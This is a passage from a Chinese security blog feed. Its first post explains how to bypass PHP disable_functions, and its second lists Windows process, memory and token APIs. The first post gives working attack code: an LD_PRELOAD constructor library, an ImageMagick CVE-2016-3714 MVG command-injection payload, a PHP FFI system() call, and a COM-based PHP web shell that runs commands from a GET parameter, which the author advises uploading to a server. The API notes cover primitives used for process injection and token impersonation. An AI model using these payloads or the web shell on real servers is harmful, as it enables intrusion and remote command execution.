src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219154617.png" alt="QQ截图20210219154617"></p><h3 id="mail函数更广的攻击面-attribute-constructor"><a href="#mail函数更广的攻击面-attribute-constructor" class="headerlink" title="mail函数更广的攻击面: attribute ((constructor))"></a>mail函数更广的攻击面: <strong>attribute</strong> ((<strong>constructor</strong>))</h3><p>如果我们的linux里没有sendmail指令了呢？这个时候就要用到 <strong>attribute</strong> ((<strong>constructor</strong>)) 了</p><p><strong>attribute</strong> ((<strong>constructor</strong>)) ：加载共享库时就自动运行,通常再程序启动时运行（有点类似魔术函数？哈哈)<br>c语言代码:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void angel (void)&#123;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    system(&quot;ls&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>LD_PRELOAD指定一下该so，执行PHP程序，可见payload确实被实现了</p><h2 id="脏东西-使用蚁剑-disable-functions绕过插件"><a href="#脏东西-使用蚁剑-disable-functions绕过插件" class="headerlink" title="脏东西:使用蚁剑 disable_functions绕过插件"></a>脏东西:使用蚁剑 disable_functions绕过插件</h2><p>蛮无脑的,把这个插件开了就完事了</p><h2 id="ImageMagick漏洞（CVE-2016-3714）"><a href="#ImageMagick漏洞（CVE-2016-3714）" class="headerlink" title="ImageMagick漏洞（CVE-2016-3714）"></a>ImageMagick漏洞（CVE-2016-3714）</h2><p> 参考 <a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html">https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html</a></p><h3 id="何为ImageMagick"><a href="#何为ImageMagick" class="headerlink" title="何为ImageMagick"></a>何为ImageMagick</h3><p>简而言之，就是一个处理图片的程序。</p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>ImageMagick有一个功能叫做 delegate(委托),作用是调用外部的lib处理文件。<br>在ImageMagick的配置文件 /etc/ImageMagick/delegates.xml 可以看到所有的委托(自己去看)</p><p>它的委托一般是长这样的,意思是在处理https图片时，会调用command的里的指令.command里的%m代表一种占位符，%m占位符代表获取https图片的url（当然占位符不仅仅%m一种，还有 比如%i是输入的文件名，%l是图片exif label信息 等等等等)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;delegate decode&#x3D;&quot;https&quot; command&#x3D;&quot;&quot;curl&quot; -s -k -o &quot;%o&quot; &quot;https:%M&quot;&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure><p>ImageMagick默认支持一种图片格式，叫mvg，而mvg与svg格式类似，其中是以文本形式写入矢量图的内容，而这其中就可以包含https处理过程。 所以我们可以构造一个mvg文件(文件名后缀不一定非得.mvg，imagemagick是按照文件内容来区分文件类型的)交给imagemagick处理，在其包含https处使用|或&amp;分割命令，造成rce,如</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#39;url(https:&#x2F;&#x2F;&quot;|mkdir &#x2F;nmsl; &quot;)&#39;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p>上面是mvg的一种格式，其中在fill处填入https的url.</p><h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217152837.png" alt="QQ截图20210217152837"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217152846.png" alt="QQ截图20210217152846"></p><h2 id="ffi-rce"><a href="#ffi-rce" class="headerlink" title="ffi rce"></a>ffi rce</h2><p>适用版本:php&gt;7.4<br>需要： FFI support = enable ，（开启ffi)<br><code>opcache.preload</code> 启用. (指定将在服务器启动时编译和执行的PHP文件，文件中定义的所有函数和大多数类都将永久加载到 PHP 的函数和类表中，并在将来的任何请求的上下文中永久可用)。 (极大拓宽ffi rce攻击面)</p><p>ffi是php&gt;7.4新增的一个东西，简而言之就是一个可以在php里调用c语言代码的接口.</p><p><a href="https://www.php.net/manual/en/ffi.examples-basic.php">https://www.php.net/manual/en/ffi.examples-basic.php</a> 官方文档</p><p>我们的payload雏形一般是这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ffi&#x3D;FFI::cdef&#123;</span><br><span class="line">   &quot;int system(char *format);&quot;</span><br><span class="line">&#125;;</span><br><span class="line">$ffi-&gt;system(command);</span><br></pre></td></tr></table></figure><p>找个机会让服务器调用FFI就可以了，这样就可以绕过disable_functions了</p><h2 id="利用Windows系统组件COM绕过"><a href="#利用Windows系统组件COM绕过" class="headerlink" title="利用Windows系统组件COM绕过"></a>利用Windows系统组件COM绕过</h2><p>需求: windows系统，且system32目录下存在wshom.ocx<br>php.ini里com.allow_dcom=true<br>php.ini里extension=php_com_dotnet.dll(没有的话自己加上)</p><p>正确配置后，在phpinfo中看,这样就算配置好了环境</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219155029.png" alt="QQ截图20210219155029"></p><p>ban掉函数</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219155038.png" alt="QQ截图20210219155038"></p><p>.这种情况我们来绕绕disable_functions</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$command &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line">$wsh &#x3D; new COM(&#39;WScript.shell&#39;); &#x2F;&#x2F; 生成一个COM对象　Shell.Application也能</span><br><span class="line">$exec &#x3D; $wsh-&gt;exec(&quot;cmd &#x2F;c&quot;.$command); &#x2F;&#x2F;调用对象方法来执行命令</span><br><span class="line">$stdout &#x3D; $exec-&gt;StdOut();</span><br><span class="line">$stroutput &#x3D; $stdout-&gt;ReadAll();</span><br><span class="line">echo $stroutput;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>找个机会把这个脚本传到服务器上,然后访问它，cmd传命令就可以了</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219155052.png" alt="QQ截图20210219155052"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;RCE函数黑名单绕过&quot;&gt;&lt;a href=&quot;#RCE函数黑名单绕过&quot; class=&quot;headerlink&quot; title=&quot;RCE函数黑名单绕过:&quot;&gt;&lt;/a&gt;RCE函数黑名单绕过:&lt;/h2&gt;&lt;p&gt;1.exec/shell_exec (执行系统命令,无回显)&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
    <category term="php开发与安全" scheme="http://const27.com/tags/php%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>记录一下用过的c++ windows api</title>
    <link href="http://const27.com/2021/02/19/%E7%94%A8%E8%BF%87%E7%9A%84API%E8%AE%B0%E5%BD%95/"/>
    <id>http://const27.com/2021/02/19/%E7%94%A8%E8%BF%87%E7%9A%84API%E8%AE%B0%E5%BD%95/</id>
    <published>2021-02-19T09:22:00.344Z</published>
    <updated>2021-02-19T08:47:36.378Z</updated>
    
    <content type="html"><![CDATA[<h2 id="API-收录一下调过的API"><a href="#API-收录一下调过的API" class="headerlink" title="API:收录一下调过的API"></a>API:收录一下调过的API</h2><h3 id="进程与内存"><a href="#进程与内存" class="headerlink" title="进程与内存"></a>进程与内存</h3><h4 id="打开一个已存在的本地进程-OpenProcess"><a href="#打开一个已存在的本地进程-OpenProcess" class="headerlink" title="打开一个已存在的本地进程:OpenProcess"></a>打开一个已存在的本地进程:OpenProcess</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HANDLE OpenProcess(</span><br><span class="line">  DWORD dwDesiredAccess,</span><br><span class="line">  BOOL  bInheritHandle,</span><br><span class="line">  DWORD dwProcessId</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>dwdesiredaccess 指定能获得指定进程哪些权限。可选值如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PROCESS_ALL_ACCESS  &#x2F;&#x2F;所有能获得的权限</span><br><span class="line">PROCESS_CREATE_PROCESS  &#x2F;&#x2F;需要创建一个进程</span><br><span class="line">PROCESS_CREATE_THREAD   &#x2F;&#x2F;需要创建一个线程</span><br><span class="line">PROCESS_DUP_HANDLE      &#x2F;&#x2F;重复使用DuplicateHandle句柄</span><br><span class="line">PROCESS_QUERY_INFORMATION   &#x2F;&#x2F;获得进程信息的权限，如它的退出代码、优先级</span><br><span class="line">PROCESS_QUERY_LIMITED_INFORMATION  &#x2F;*获得某些信息的权限，如果获得了PROCESS_QUERY_INFORMATION，也拥有PROCESS_QUERY_LIMITED_INFORMATION权限*&#x2F;</span><br><span class="line">PROCESS_SET_INFORMATION    &#x2F;&#x2F;设置某些信息的权限，如进程优先级</span><br><span class="line">PROCESS_SET_QUOTA          &#x2F;&#x2F;设置内存限制的权限，使用SetProcessWorkingSetSize</span><br><span class="line">PROCESS_SUSPEND_RESUME     &#x2F;&#x2F;暂停或恢复进程的权限</span><br><span class="line">PROCESS_TERMINATE          &#x2F;&#x2F;终止一个进程的权限，使用TerminateProcess</span><br><span class="line">PROCESS_VM_OPERATION       &#x2F;&#x2F;操作进程内存空间的权限(可用VirtualProtectEx和WriteProcessMemory) </span><br><span class="line">PROCESS_VM_READ            &#x2F;&#x2F;读取进程内存空间的权限，可使用ReadProcessMemory</span><br><span class="line">PROCESS_VM_WRITE           &#x2F;&#x2F;读取进程内存空间的权限，可使用WriteProcessMemory</span><br><span class="line">SYNCHRONIZE                &#x2F;&#x2F;等待进程终止</span><br></pre></td></tr></table></figure><p>bInheritHandle 若为TRUE，则表示所得到的进程句柄可被进程<br>dwProcessId 表示要获取的进程的PID</p><p>函数成功执行，则返回指定进程的句柄。反之则NULL。</p><h4 id="在指定进程的虚拟地址空间中保留，开辟，禁用一段区域-VirtualAllocEx"><a href="#在指定进程的虚拟地址空间中保留，开辟，禁用一段区域-VirtualAllocEx" class="headerlink" title="在指定进程的虚拟地址空间中保留，开辟，禁用一段区域 : VirtualAllocEx"></a>在指定进程的虚拟地址空间中保留，开辟，禁用一段区域 : VirtualAllocEx</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LPVOID VirtualAllocEx(</span><br><span class="line">  HANDLE hProcess,</span><br><span class="line">  LPVOID lpAddress,</span><br><span class="line">  SIZE_T dwSize,</span><br><span class="line">  DWORD  flAllocationType,</span><br><span class="line">  DWORD  flProtect</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hProcess 指定的进程的句柄。该句柄需有<strong>PROCESS_VM_OPERATION</strong>权限（操作进程内存空间的权限）</p><p>lpAddress 一个指针，用于选择你想分配的内存的开始地址。如果填NULL，则由dwsize的设置来自动分配。</p><p>dwSize 欲分配的内存大小（字节单位）。实际分配的大小是该值与页内存对齐后的结果。如果lpAddress为NULL，则会选中从进程首地址到dwSize的页对齐后的内存区域<br>如果lpAddress不为NULL，则选定lpaddress到lpaddress+dwsize的按照页对齐后的内存区域。</p><p>flAllocationType 内存分配的类型。有很多值，MSDN上有记录。<br><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex</a><br>这个值用来确定一段内存区域用于被置0(commit)还是保留(reserve)还是禁用(reset)</p><p>flProtect 内存保护常数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PAGE_NOACCESS</span><br><span class="line">PAGE_GUARD</span><br><span class="line">PAGE_NOCACHE</span><br><span class="line">PAGE_WRITECOMBINE</span><br></pre></td></tr></table></figure><p>若函数执行成功，则返回分配的内存地址的基地址。</p><h4 id="在指定进程的虚拟地址空间中释放或decommit一段区域-VirtualFreeEx"><a href="#在指定进程的虚拟地址空间中释放或decommit一段区域-VirtualFreeEx" class="headerlink" title="在指定进程的虚拟地址空间中释放或decommit一段区域 : VirtualFreeEx"></a>在指定进程的虚拟地址空间中释放或decommit一段区域 : VirtualFreeEx</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BOOL VirtualFreeEx(</span><br><span class="line">  HANDLE hProcess,</span><br><span class="line">  LPVOID lpAddress,</span><br><span class="line">  SIZE_T dwSize,</span><br><span class="line">  DWORD  dwFreeType</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hprocess 进程句柄，需有<strong>PROCESS_VM_OPERATION</strong>权限</p><p>lpaddress 一个指向需要被释放或decommit内存区域首地址的指针。若dwfreetype为mem_release(释放),则这里应该填入VirtualAllocEx方法返回的保留的内存区域的基地址。</p><p>dwsize 需要被decommit的内存大小。<br>若dwfreetype为MEM_RELEASE 则此处填0<br>若为MEM_DECOMMIT，则此处填内存大小。 选定lpaddress到lpaddress+dwsize的按照页对齐后的内存区域。</p><p>dwfreetype 需要对内存区域进行的操作。有MEM_DECOMMIT和MEM_RELEASE，更多参数参考MSDN<a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfreeex">https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfreeex</a></p><p>若函数执行成功则返回一个非零值，不成功则返回0</p><h4 id="向指定进程的内存区域写入-WriteProcessMemory"><a href="#向指定进程的内存区域写入-WriteProcessMemory" class="headerlink" title="向指定进程的内存区域写入: WriteProcessMemory"></a>向指定进程的内存区域写入: WriteProcessMemory</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BOOL WriteProcessMemory(</span><br><span class="line">  HANDLE  hProcess,</span><br><span class="line">  LPVOID  lpBaseAddress,</span><br><span class="line">  LPCVOID lpBuffer,</span><br><span class="line">  SIZE_T  nSize,</span><br><span class="line">  SIZE_T  *lpNumberOfBytesWritten</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hprocess 进程句柄</p><p>lpbaseaddress 需要写入的内存区域的起始地址指针</p><p>lpbuffer 指向缓冲区的指针，该缓冲区包含要在指定进程的地址空间中写入的数据。</p><p>nsize 需要写入的数据大小（字节单位）</p><p>lpNumberOfBytesWritten 可选，用来存放”要被写入的数据“的变量</p><p>若成功则返回非0值，反之则0</p><h4 id="在一个进程内存空间中创建一个线程：CreateRemoteThread"><a href="#在一个进程内存空间中创建一个线程：CreateRemoteThread" class="headerlink" title="在一个进程内存空间中创建一个线程：CreateRemoteThread"></a>在一个进程内存空间中创建一个线程：CreateRemoteThread</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HANDLE CreateRemoteThread(</span><br><span class="line">  HANDLE                 hProcess,</span><br><span class="line">  LPSECURITY_ATTRIBUTES  lpThreadAttributes,</span><br><span class="line">  SIZE_T                 dwStackSize,</span><br><span class="line">  LPTHREAD_START_ROUTINE lpStartAddress,</span><br><span class="line">  LPVOID                 lpParameter,</span><br><span class="line">  DWORD                  dwCreationFlags,</span><br><span class="line">  LPDWORD                lpThreadId</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hprocess 进程句柄</p><p>lpThreadAttributes 安全描述符</p><p>dwStackSize 栈大小，若为0则为默认值</p><p>lpStartAddress 要创建的线程的实现函数的首地址</p><p>lpParameter 传递给线程函数的参数</p><p>dwCreationFlags 线程控制参数</p><table><thead><tr><th>0</th><th align="left">The thread runs immediately after creation.</th></tr></thead><tbody><tr><td><strong>CREATE_SUSPENDED</strong>0x00000004</td><td align="left">The thread is created in a suspended state, and does not run until the <a href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-resumethread">ResumeThread</a> function is called.</td></tr><tr><td><strong>STACK_SIZE_PARAM_IS_A_RESERVATION</strong>0x00010000</td><td align="left">The <em>dwStackSize</em> parameter specifies the initial reserve size of the stack. If this flag is not specified, <em>dwStackSize</em> specifies the commit size.</td></tr></tbody></table><p>lpThreadId 线程标识符，如果线程不返回标识符则此项填NULL</p><h4 id="关闭一个句柄-CloseHandle"><a href="#关闭一个句柄-CloseHandle" class="headerlink" title="关闭一个句柄:CloseHandle"></a>关闭一个句柄:CloseHandle</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BOOL CloseHandle(</span><br><span class="line">  HANDLE hObject</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hobject 要被关闭的句柄</p><p>成功则返回非0值，反之则0</p><h3 id="令牌与命名管道"><a href="#令牌与命名管道" class="headerlink" title="令牌与命名管道"></a>令牌与命名管道</h3><h4 id="创建命名管道句柄-CreateNamedPipeA"><a href="#创建命名管道句柄-CreateNamedPipeA" class="headerlink" title="创建命名管道句柄:CreateNamedPipeA"></a>创建命名管道句柄:CreateNamedPipeA</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HANDLE CreateNamedPipeA(</span><br><span class="line">  LPCSTR                lpName,</span><br><span class="line">  DWORD                 dwOpenMode,</span><br><span class="line">  DWORD                 dwPipeMode,</span><br><span class="line">  DWORD                 nMaxInstances,</span><br><span class="line">  DWORD                 nOutBufferSize,</span><br><span class="line">  DWORD                 nInBufferSize,</span><br><span class="line">  DWORD                 nDefaultTimeOut,</span><br><span class="line">  LPSECURITY_ATTRIBUTES lpSecurityAttributes</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>lpName 唯一的管道名。格式是固定的: \.\pipe*pipename*</p><p>dwOpenMode 管道的开启方式。有三种：1.数据在服务器和客户机双向流通 <strong>PIPE_ACCESS_DUPLEX</strong>。2.数据只能从服务器流向客户机 <strong>PIPE_ACCESS_OUTBOUND</strong>。3.数据只能从客户机流向服务器 <strong>PIPE_ACCESS_INBOUND</strong>。具体请参考官方文档。以及一些附加参数，详情参考官方文档 <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea">https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea</a></p><p>dwPipeMode 管道通信方式。指定字节流或者消息流通信，指定远程链接的访问方式，指定等待方式，详情参考官方文档</p><p>nMaxInstancees 管道的最大实例数</p><p>nOutBufferSize&amp;nInBufferSize 为输出&amp;输入缓存区保留的内存字节大小</p><p>nDefaultTimeOut 设定超时值。置0则为50ms</p><p>lpSecurityAttributes 设置安全描述符</p><p>若函数执行成功则返回管道服务器句柄。反之则返回<strong>INVALID_HANDLE_VALUE</strong></p><h4 id="开启一个命名管道等待链接-ConnectNamedPipe"><a href="#开启一个命名管道等待链接-ConnectNamedPipe" class="headerlink" title="开启一个命名管道等待链接: ConnectNamedPipe"></a>开启一个命名管道等待链接: ConnectNamedPipe</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BOOL ConnectNamedPipe(</span><br><span class="line">  HANDLE       hNamedPipe,</span><br><span class="line">  LPOVERLAPPED lpOverlapped</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hNamedPipe 指定一个命名管道句柄，该句柄由CreateNamedPipe函数返回</p><p>lpOverlapped 一个指向重叠结构的指针，一般为NULL。详情参考官方文档<br><a href="https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe">https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe</a></p><p>一般来说，当由客户机连上时返回true，没有客户机链接或链接丢失返回false</p><h4 id="模拟一个命名管道客户端-ImpersonateNamedPipeClient"><a href="#模拟一个命名管道客户端-ImpersonateNamedPipeClient" class="headerlink" title="模拟一个命名管道客户端:ImpersonateNamedPipeClient"></a>模拟一个命名管道客户端:ImpersonateNamedPipeClient</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BOOL ImpersonateNamedPipeClient(</span><br><span class="line">  HANDLE hNamedPipe</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hNamedPipe 即指定的命名管道服务端。</p><p>这个函数有个坑点是，服务端才能用这个函数，且必须在服务端读取客户端传来的数据后才能成功，否则就会返回1368错误。</p><h4 id="获取当前线程令牌句柄-GetCurrentThreadToken"><a href="#获取当前线程令牌句柄-GetCurrentThreadToken" class="headerlink" title="获取当前线程令牌句柄: GetCurrentThreadToken"></a>获取当前线程令牌句柄: GetCurrentThreadToken</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HANDLE GetCurrentThreadToken();</span><br></pre></td></tr></table></figure><p>无参数，直接返回当前线程虚拟句柄</p><h4 id="以令牌创建一个进程（1）-CreateProcessWithTokenW"><a href="#以令牌创建一个进程（1）-CreateProcessWithTokenW" class="headerlink" title="以令牌创建一个进程（1）: CreateProcessWithTokenW"></a>以令牌创建一个进程（1）: CreateProcessWithTokenW</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BOOL CreateProcessWithTokenW(</span><br><span class="line">  HANDLE                hToken,</span><br><span class="line">  DWORD                 dwLogonFlags,</span><br><span class="line">  LPCWSTR               lpApplicationName,</span><br><span class="line">  LPWSTR                lpCommandLine,</span><br><span class="line">  DWORD                 dwCreationFlags,</span><br><span class="line">  LPVOID                lpEnvironment,</span><br><span class="line">  LPCWSTR               lpCurrentDirectory,</span><br><span class="line">  LPSTARTUPINFOW        lpStartupInfo,</span><br><span class="line">  LPPROCESS_INFORMATION lpProcessInformation</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>有点不懂，链接在这里<a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw">https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw</a></p><p>hToken 表示用户的令牌 必须有 TOKEN_QUERY, TOKEN_DUPLICATE, and TOKEN_ASSIGN_PRIMARY 权限</p><p>dwLogonFlags 登陆选项。<strong>LOGON_WITH_PROFILE</strong>或<strong>LOGON_NETCREDENTIALS_ONLY</strong></p><p>lpApplicationName 要被执行的模块。（比如 C:\Windows\system32\notepad.exe )</p><p>lpCommandLine 要被执行的命令。如果为NULL则把 lpApplicationName 当作要执行的命令</p><p>dwCreationFlags 控制进程的创建方式。参考MSDN</p><p>lpEnvironment 指向新进程环境块的指针。</p><p>lpCurrentDirectory 指向进程的“当前目录”路径。若NULL则“当前目录”为调用程序的“当前目录”</p><p>lpStartUpInfo 指向  <a href="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-startupinfoa">STARTUPINFO</a>或<a href="https://docs.microsoft.com/en-us/windows/desktop/api/winbase/ns-winbase-startupinfoexa">STARTUPINFOEX</a> 结构体</p><p>lpProcessInformation 指向  <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information">PROCESS_INFORMATION</a> 结果的指针</p><p>坑点：调用该函数的进程必须有 SE_IMPERSONATE_NAME 权限，不然会返回ERROR:1314</p><h4 id="以令牌创建一个进程（2）-CreateProcessAsUserA"><a href="#以令牌创建一个进程（2）-CreateProcessAsUserA" class="headerlink" title="以令牌创建一个进程（2）: CreateProcessAsUserA"></a>以令牌创建一个进程（2）: CreateProcessAsUserA</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BOOL CreateProcessAsUserA(</span><br><span class="line">  HANDLE                hToken,</span><br><span class="line">  LPCSTR                lpApplicationName,</span><br><span class="line">  LPSTR                 lpCommandLine,</span><br><span class="line">  LPSECURITY_ATTRIBUTES lpProcessAttributes,</span><br><span class="line">  LPSECURITY_ATTRIBUTES lpThreadAttributes,</span><br><span class="line">  BOOL                  bInheritHandles,</span><br><span class="line">  DWORD                 dwCreationFlags,</span><br><span class="line">  LPVOID                lpEnvironment,</span><br><span class="line">  LPCSTR                lpCurrentDirectory,</span><br><span class="line">  LPSTARTUPINFOA        lpStartupInfo,</span><br><span class="line">  LPPROCESS_INFORMATION lpProcessInformation</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>大致上与CreateProcessWithTokenW一样。<br>但是调用这个函数的进程必须有<strong>SE_INCREASE_QUOTA_NAME</strong>，或者<strong>SE_ASSIGNPRIMARYTOKEN_NAME</strong>权限，不然会返回ERROR:1314</p><h4 id="为已存在的Token创建副本-DuplicateTokenEx"><a href="#为已存在的Token创建副本-DuplicateTokenEx" class="headerlink" title="为已存在的Token创建副本: DuplicateTokenEx"></a>为已存在的Token创建副本: DuplicateTokenEx</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BOOL DuplicateTokenEx(</span><br><span class="line">  HANDLE                       hExistingToken,</span><br><span class="line">  DWORD                        dwDesiredAccess,</span><br><span class="line">  LPSECURITY_ATTRIBUTES        lpTokenAttributes,</span><br><span class="line">  SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,</span><br><span class="line">  TOKEN_TYPE                   TokenType,</span><br><span class="line">  PHANDLE                      phNewToken</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hExistingToken 一个指针，指向一个有 TOKEN_DUPLICATE 权的Token</p><p>dwDesiredAccess 为新Token设置权限。若置0则表示权限与原Token相同。<br>下面是权限列表 <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-rights-for-access-token-objects">https://docs.microsoft.com/en-us/windows/win32/secauthz/access-rights-for-access-token-objects</a></p><p>lpTokenAttributes 指向安全描述符的指针。若为NULL，则为默认安全描述符且句柄不能被继承</p><p>ImpersonationLevel 从 <a href="https://docs.microsoft.com/en-us/windows/desktop/api/winnt/ne-winnt-security_impersonation_level">SECURITY_IMPERSONATION_LEVEL</a> 中选择一个值填入。决定模仿的程度。</p><p>TokenType 选择<strong>TokenPrimary</strong> or <strong>TokenImpersonation</strong>填入。决定Token是primary token（能被用来执行CreateProcessAsUser）还是impersonation token</p><p>phNewToken 指针，指向承载新Token的Handle变量。</p><h3 id="文件IO"><a href="#文件IO" class="headerlink" title="文件IO"></a>文件IO</h3><h4 id="获得文件句柄：GetMoudleHandleA"><a href="#获得文件句柄：GetMoudleHandleA" class="headerlink" title="获得文件句柄：GetMoudleHandleA"></a>获得文件句柄：GetMoudleHandleA</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HMODULE GetModuleHandleA(</span><br><span class="line">  LPCSTR lpModuleName</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>lpModuleName即要获取的文件句柄的文件名，可为exe或dll。<br>若文件名没有后缀名则默认视为dll文件。<br>若该项为NULL，则返回当前进程的文件句柄。<br>存在于Kerner32.dll中<br>这里介绍一些HMOUDLE是个什么玩意<br>一般就是一个线性地址，用于记录一个文件句柄的地址。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217151436.png" alt="QQ截图20210217151436"></p><h4 id="从dll文件句柄中获得函数：GetProcAddress"><a href="#从dll文件句柄中获得函数：GetProcAddress" class="headerlink" title="从dll文件句柄中获得函数：GetProcAddress"></a>从dll文件句柄中获得函数：GetProcAddress</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FARPROC GetProcAddress(</span><br><span class="line">  HMODULE hModule,</span><br><span class="line">  LPCSTR  lpProcName</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hmodule 表示要传入的dll文件句柄。这个句柄可以由  <a href="https://docs.microsoft.com/en-us/windows/desktop/api/libloaderapi/nf-libloaderapi-loadlibrarya">LoadLibrary</a>, <a href="https://docs.microsoft.com/en-us/windows/desktop/api/libloaderapi/nf-libloaderapi-loadlibraryexa">LoadLibraryEx</a>, <a href="https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-loadpackagedlibrary">LoadPackagedLibrary</a>, or <a href="https://docs.microsoft.com/en-us/windows/desktop/api/libloaderapi/nf-libloaderapi-getmodulehandlea">GetModuleHandle</a> 等方法得到。</p><p>lpProcName表示要从dll文件中获得的函数没或者变量名。<br>若函数执行不成功，则返回NULL，否则返回函数或者变量的地址</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217151441.png" alt="QQ截图20210217151441"></p><h4 id="获得一个已存在文件句柄或者新建文件句柄-CreateFile"><a href="#获得一个已存在文件句柄或者新建文件句柄-CreateFile" class="headerlink" title="获得一个已存在文件句柄或者新建文件句柄:CreateFile"></a>获得一个已存在文件句柄或者新建文件句柄:CreateFile</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HANDLE CreateFileW(</span><br><span class="line">  LPCWSTR               lpFileName,</span><br><span class="line">  DWORD                 dwDesiredAccess,</span><br><span class="line">  DWORD                 dwShareMode,</span><br><span class="line">  LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span><br><span class="line">  DWORD                 dwCreationDisposition,</span><br><span class="line">  DWORD                 dwFlagsAndAttributes,</span><br><span class="line">  HANDLE                hTemplateFile</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>lpFileName 文件路径</p><p>dwDesiredAccess 对文件的访问控制：读，写。<strong>GENERIC_READ</strong>, <strong>GENERIC_WRITE</strong>, or both (<code>GENERIC_READ | GENERIC_WRITE</code>)</p><p>dwShareMode 零表示不共享； FILE_SHARE_READ 和 / 或 FILE_SHARE_WRITE 表示允许对文件进行共享访问</p><p>lpSecurityAttributes 安全描述符</p><p>dwCreationDisposition 在文件不存在或存在时采取的操作</p><p>dwFlagsAndAttributes 设置文件标志位</p><p>hTemplateFile 多数情况下为NULL</p><h4 id="写文件-ReadFile"><a href="#写文件-ReadFile" 